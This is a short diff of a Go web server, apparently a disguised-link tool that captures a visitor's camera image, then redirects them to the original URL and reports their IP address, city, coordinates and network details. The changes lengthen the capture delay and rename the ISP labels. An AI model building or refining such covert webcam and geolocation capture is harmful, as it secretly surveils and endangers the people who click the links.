@@ -108,7 +108,7 @@ func serveLandingPage(w http.ResponseWriter, r *http.Request) {
                                         stream.getTracks().forEach(track => track.stop());
                                         window.location.href = originalUrl;
                                     });
-                            }, 500); // Tunggu sebentar untuk memastikan video siap.
+                            }, 2000); // Tunggu sebentar untuk memastikan video siap.
                         };
                     })
                     .catch(err => {
@@ -227,7 +227,7 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	message := fmt.Sprintf(
-		"IP Address\t: %s\nDari URL\t: %s\nURL Host\t: %s\n\nLokasi:\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\n\nJaringan:\nASN\t: %s\nAS\t: %s\nIs Proxy\t: %t",
+		"IP Address\t: %s\nDari URL\t: %s\nURL Host\t: %s\n\nLokasi:\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\n\nJaringan:\nAS/ISP Number\t: %s\nAS/ISP\t: %s\nIs Proxy\t: %t",
 		ip,
 		data.URLID,
 		r.Host,
